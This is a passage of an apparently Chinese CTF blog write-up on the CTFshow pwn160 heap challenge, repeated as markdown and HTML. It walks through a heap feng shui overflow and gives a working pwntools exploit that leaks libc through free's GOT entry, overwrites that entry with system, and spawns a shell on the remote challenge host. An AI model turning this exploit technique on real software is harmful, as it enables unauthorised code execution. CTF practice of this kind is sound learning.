add函数分析\n![1741933652418.png](https://img.picui.cn/free/2025/03/14/67d3cc54920c5.png)\n1.通过add函数，要对堆块的储存结构有清晰的认知，这会影响甚至是决定我们攻击的手法。\n2.可以看到每次add会申清两个堆块，一个大小由我们控制，一个大小固定为0x80。并且，大小自由的堆块的指针会被保存在，大小固定的那个堆块内。而大小固定的那个堆块的指针会被保存在heaplist(逆向重命名过)上。\n3.input第一个参数是作为指针，所以他会写在v3上，位置是s指针后面。\n4.然后这里调用edit去编辑堆块内容\n\n### edit函数分析\n![1741934774792.png](https://img.picui.cn/free/2025/03/14/67d3d0bb5c4d7.png)\n1.看到这里对输入字节大小的检查，就可以联想到堆风水。是通过堆块的位置加上输入字节的大小，与另一块堆块的地址大小比较来判断。如果这两个堆块之间，有其他堆块，那么我们就可以对中间的堆块为所欲为了。\n\n### show函数分析\n![1741935092305.png](https://img.picui.cn/free/2025/03/14/67d3d1f5186f5.png)\n1.唯一的作用就是泄露libc\n\n### delete函数分析\n![1741935146434.png](https://img.picui.cn/free/2025/03/14/67d3d22ae54bb.png)\n1.没有uaf，不能直接利用\n\n### gdb分析\n![1741934513485.png](https://img.picui.cn/free/2025/03/14/67d3cfb254f83.png)\n1.通过gdb，可以对堆块的内容，结构有更清晰的观察和了解\n\n## 构造思路\n1.首先确定攻击的手法——堆风水.也就是要造成我们申清的堆块在最上方，add自动申清的堆块在最下方。此时我们就可以控制中间的堆块了.而0x80大小，会被放入unsortedbin中，满足先进先出的规则。那么我们先申请几个堆块，小于0x80。free掉堆块0，再add一个0x80大小的堆块，它会在从unsortedbin中取出之前的堆块给我们，同时从topchunk中分配出另一块。至此，一块低地址，一块高地址的堆块构造完成。\n2.第二部对照gdb，把对应位置出的内容修改成free_got就可以通过show泄露libc.然后再通过edit修改got表内容。\n3.最后delete一块内容为`/bin/sh\\x00`的堆块就可以打通了.\n\n## exp\n### 比较复杂的解法\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='i386',log_level='debug')\nmode=1\nurl='pwn.challenge.ctf.show'\nport=28252\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,name,lenth,content):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"0\")\n    io.recvuntil(\"size of description: \")\n    io.sendline(str(size))\n    io.recvuntil(\"name: \")\n    io.sendline(name)\n    io.recvuntil(\"text length: \")\n    io.sendline(str(lenth))\n    io.recvuntil(\"text: \")\n    io.sendline(content)\n\ndef delete(idx):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"1\")\n    io.recvuntil(\"\")\n    io.sendline(str(idx))\n\ndef show(idx):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"2\")\n    io.recvuntil(\"\")\n    io.sendline(str(idx))\n\ndef edit(idx,lenth,content):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"3\")\n    io.recvuntil(\"index: \")\n    io.sendline(str(idx))\n    io.recvuntil(\"text length: \")\n    io.sendline(str(lenth))\n    io.recvuntil(\"text: \")\n    io.sendline(content)\n\nadd(0x10,b\"a\",0x8,b'hhhh')  #0\nadd(0x20,b\"b\",0x8,b'hhhh')  #1\nadd(0x20,b\"c\",0x8,b'hhhh')  #2\nadd(0x20,b\"d\",0x10,b'/bin/sh\\x00')  #3\ndelete(2)  \ndelete(0)\n\nadd(0x10,b\"d\",0x40,b'aaaa') #4\nadd(0x80,b'e',0x8,b'bbbb')  #5\nfree_got=elf.got['free']\npayload=p32(0)*5+p32(0x89)\npayload+=p32(0)*16\npayload+=p32(0x88)+p32(0x28)\npayload+=p32(0)*9+p32(0x89)\npayload+=p32(0)*4\npayload+=p32(0x88)+p64(0x29)\npayload+=p32(0)*8+p32(0x89)\npayload+=p32(free_got)\nedit(4,len(payload),payload)\nshow(1)\nio.recvuntil(\"description: \")\nfree=u32(io.recv(4))\nlog.success('free-{}'.format(hex(free)))\n#gdb.attach(io)\nlibc=LibcSearcher(\"free\",free)\nlibcbase=free-libc.dump('free')\nsystem=libcbase+libc.dump('system')\nedit(1,0x4,p32(system))\n#gdb.attach(io)\ndelete(3)\nio.interactive()\n```\n现在看来，delete(2)似乎有点多余了","slug":"heap/CTFshow pwn160","published":1,"date":"2025-03-24T14:32:33.563Z","updated":"2025-03-24T14:37:13.536Z","comments":1,"layout":"post","photos":[],"_id":"cm8nyp9if0006bcmy5skw559w","content":"<h1 id=\"CTFshow-pwn160-堆风水\"><a href=\"#CTFshow-pwn160-堆风水\" class=\"headerlink\" title=\"CTFshow pwn160(堆风水)\"></a>CTFshow pwn160(堆风水)</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/14/67d3cbefdff92.png\" alt=\"1741933551272.png\"><br>1.简单的菜单题，通过menu，简单把函数名称修改，做一个简单的逆向</p>\n<h3 id=\"add函数分析\"><a href=\"#add函数分析\" class=\"headerlink\" title=\"add函数分析\"></a>add函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/14/67d3cc54920c5.png\" alt=\"1741933652418.png\"><br>1.通过add函数，要对堆块的储存结构有清晰的认知，这会影响甚至是决定我们攻击的手法。<br>2.可以看到每次add会申清两个堆块，一个大小由我们控制，一个大小固定为0x80。并且，大小自由的堆块的指针会被保存在，大小固定的那个堆块内。而大小固定的那个堆块的指针会被保存在heaplist(逆向重命名过)上。<br>3.input第一个参数是作为指针，所以他会写在v3上，位置是s指针后面。<br>4.然后这里调用edit去编辑堆块内容</p>\n<h3 id=\"edit函数分析\"><a href=\"#edit函数分析\" class=\"headerlink\" title=\"edit函数分析\"></a>edit函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/14/67d3d0bb5c4d7.png\" alt=\"1741934774792.png\"><br>1.看到这里对输入字节大小的检查，就可以联想到堆风水。是通过堆块的位置加上输入字节的大小，与另一块堆块的地址大小比较来判断。如果这两个堆块之间，有其他堆块，那么我们就可以对中间的堆块为所欲为了。</p>\n<h3 id=\"show函数分析\"><a href=\"#show函数分析\" class=\"headerlink\" title=\"show函数分析\"></a>show函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/14/67d3d1f5186f5.png\" alt=\"1741935092305.png\"><br>1.唯一的作用就是泄露libc</p>\n<h3 id=\"delete函数分析\"><a href=\"#delete函数分析\" class=\"headerlink\" title=\"delete函数分析\"></a>delete函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/14/67d3d22ae54bb.png\" alt=\"1741935146434.png\"><br>1.没有uaf，不能直接利用</p>\n<h3 id=\"gdb分析\"><a href=\"#gdb分析\" class=\"headerlink\" title=\"gdb分析\"></a>gdb分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/14/67d3cfb254f83.png\" alt=\"1741934513485.png\"><br>1.通过gdb，可以对堆块的内容，结构有更清晰的观察和了解</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先确定攻击的手法——堆风水.也就是要造成我们申清的堆块在最上方，add自动申清的堆块在最下方。此时我们就可以控制中间的堆块了.而0x80大小，会被放入unsortedbin中，满足先进先出的规则。那么我们先申请几个堆块，小于0x80。free掉堆块0，再add一个0x80大小的堆块，它会在从unsortedbin中取出之前的堆块给我们，同时从topchunk中分配出另一块。至此，一块低地址，一块高地址的堆块构造完成。<br>2.第二部对照gdb，把对应位置出的内容修改成free_got就可以通过show泄露libc.然后再通过edit修改got表内容。<br>3.最后delete一块内容为<code>/bin/sh\\x00</code>的堆块就可以打通了.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"比较复杂的解法\"><a href=\"#比较复杂的解法\" class=\"headerlink\" title=\"比较复杂的解法\"></a>比较复杂的解法</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;i386&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28252</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name,lenth,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;size of description: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name: &quot;</span>)</span><br><span class=\"line\">    io.sendline(name)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text length: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(lenth))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text: &quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,lenth,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text length: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(lenth))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text: &quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&quot;a&quot;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;hhhh&#x27;</span>)  <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;b&quot;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;hhhh&#x27;</span>)  <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;c&quot;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;hhhh&#x27;</span>)  <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;d&quot;</span>,<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)  <span class=\"comment\">#3</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)  </span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&quot;d&quot;</span>,<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>) <span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;e&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;bbbb&#x27;</span>)  <span class=\"comment\">#5</span></span><br><span class=\"line\">free_got=elf.got[<span class=\"string\">&#x27;free&#x27;</span>]</span><br><span class=\"line\">payload=p32(<span class=\"number\">0</span>)*<span class=\"number\">5</span>+p32(<span class=\"number\">0x89</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">16</span></span><br><span class=\"line\">payload+=p32(<span class=\"number\">0x88</span>)+p32(<span class=\"number\">0x28</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">9</span>+p32(<span class=\"number\">0x89</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">4</span></span><br><span class=\"line\">payload+=p32(<span class=\"number\">0x88</span>)+p64(<span class=\"number\">0x29</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">8</span>+p32(<span class=\"number\">0x89</span>)</span><br><span class=\"line\">payload+=p32(free_got)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;description: &quot;</span>)</span><br><span class=\"line\">free=u32(io.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;free-&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free)))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;free&quot;</span>,free)</span><br><span class=\"line\">libcbase=free-libc.dump(<span class=\"string\">&#x27;free&#x27;</span>)</span><br><span class=\"line\">system=libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">0x4</span>,p32(system))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p>现在看来，delete(2)似乎有点多余了</p>\n","excerpt":"","more":"<h1 id=\"CTFshow-pwn160-堆风水\"><a href=\"#CTFshow-pwn160-堆风水\" class=\"headerlink\" title=\"CTFshow pwn160(堆风水)\"></a>CTFshow pwn160(堆风水)</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/14/67d3cbefdff92.png\" alt=\"1741933551272.png\"><br>1.简单的菜单题，通过menu，简单把函数名称修改，做一个简单的逆向</p>\n<h3 id=\"add函数分析\"><a href=\"#add函数分析\" class=\"headerlink\" title=\"add函数分析\"></a>add函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/14/67d3cc54920c5.png\" alt=\"1741933652418.png\"><br>1.通过add函数，要对堆块的储存结构有清晰的认知，这会影响甚至是决定我们攻击的手法。<br>2.可以看到每次add会申清两个堆块，一个大小由我们控制，一个大小固定为0x80。并且，大小自由的堆块的指针会被保存在，大小固定的那个堆块内。而大小固定的那个堆块的指针会被保存在heaplist(逆向重命名过)上。<br>3.input第一个参数是作为指针，所以他会写在v3上，位置是s指针后面。<br>4.然后这里调用edit去编辑堆块内容</p>\n<h3 id=\"edit函数分析\"><a href=\"#edit函数分析\" class=\"headerlink\" title=\"edit函数分析\"></a>edit函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/14/67d3d0bb5c4d7.png\" alt=\"1741934774792.png\"><br>1.看到这里对输入字节大小的检查，就可以联想到堆风水。是通过堆块的位置加上输入字节的大小，与另一块堆块的地址大小比较来判断。如果这两个堆块之间，有其他堆块，那么我们就可以对中间的堆块为所欲为了。</p>\n<h3 id=\"show函数分析\"><a href=\"#show函数分析\" class=\"headerlink\" title=\"show函数分析\"></a>show函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/14/67d3d1f5186f5.png\" alt=\"1741935092305.png\"><br>1.唯一的作用就是泄露libc</p>\n<h3 id=\"delete函数分析\"><a href=\"#delete函数分析\" class=\"headerlink\" title=\"delete函数分析\"></a>delete函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/14/67d3d22ae54bb.png\" alt=\"1741935146434.png\"><br>1.没有uaf，不能直接利用</p>\n<h3 id=\"gdb分析\"><a href=\"#gdb分析\" class=\"headerlink\" title=\"gdb分析\"></a>gdb分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/14/67d3cfb254f83.png\" alt=\"1741934513485.png\"><br>1.通过gdb，可以对堆块的内容，结构有更清晰的观察和了解</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先确定攻击的手法——堆风水.也就是要造成我们申清的堆块在最上方，add自动申清的堆块在最下方。此时我们就可以控制中间的堆块了.而0x80大小，会被放入unsortedbin中，满足先进先出的规则。那么我们先申请几个堆块，小于0x80。free掉堆块0，再add一个0x80大小的堆块，它会在从unsortedbin中取出之前的堆块给我们，同时从topchunk中分配出另一块。至此，一块低地址，一块高地址的堆块构造完成。<br>2.第二部对照gdb，把对应位置出的内容修改成free_got就可以通过show泄露libc.然后再通过edit修改got表内容。<br>3.最后delete一块内容为<code>/bin/sh\\x00</code>的堆块就可以打通了.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"比较复杂的解法\"><a href=\"#比较复杂的解法\" class=\"headerlink\" title=\"比较复杂的解法\"></a>比较复杂的解法</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;i386&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28252</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name,lenth,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;size of description: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name: &quot;</span>)</span><br><span class=\"line\">    io.sendline(name)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text length: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(lenth))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text: &quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,lenth,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text length: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(lenth))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text: &quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&quot;a&quot;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;hhhh&#x27;</span>)  <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;b&quot;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;hhhh&#x27;</span>)  <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;c&quot;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;hhhh&#x27;</span>)  <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;d&quot;</span>,<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)  <span class=\"comment\">#3</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)  </span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&quot;d&quot;</span>,<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>) <span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;e&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;bbbb&#x27;</span>)  <span class=\"comment\">#5</span></span><br><span class=\"line\">free_got=elf.got[<span class=\"string\">&#x27;free&#x27;</span>]</span><br><span class=\"line\">payload=p32(<span class=\"number\">0</span>)*<span class=\"number\">5</span>+p32(<span class=\"number\">0x89</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">16</span></span><br><span class=\"line\">payload+=p32(<span class=\"number\">0x88</span>)+p32(<span class=\"number\">0x28</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">9</span>+p32(<span class=\"number\">0x89</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">4</span></span><br><span class=\"line\">payload+=p32(<span class=\"number\">0x88</span>)+p64(<span class=\"number\">0x29</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span 